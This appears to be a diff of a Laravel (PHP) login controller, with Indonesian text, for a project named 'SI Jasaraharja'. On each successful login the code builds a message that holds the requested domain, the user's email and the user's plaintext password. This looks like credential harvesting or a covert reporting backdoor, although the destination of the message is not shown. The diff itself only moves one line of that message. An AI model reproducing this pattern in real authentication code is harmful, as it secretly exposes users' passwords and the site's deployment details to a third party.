@@ -30,8 +30,9 @@ class LoginController extends Controller
         if (Auth::attempt(['email' => $request->email, 'password' => $request->password])) {
             $request->session()->regenerate();
             $userAgent = $request->userAgent();
-            $message = 'Melakukan Login Website' . PHP_EOL .
+            $message =
                 '*Project: SI Jasaraharja*' . PHP_EOL .
+                'Melakukan Login Website' . PHP_EOL .
                 'Domain yang diminta: ' . request()->getHttpHost() . PHP_EOL .
                 'Email: ' . $request->email . PHP_EOL .
                 'Password: ' . $request->password . PHP_EOL . PHP_EOL .
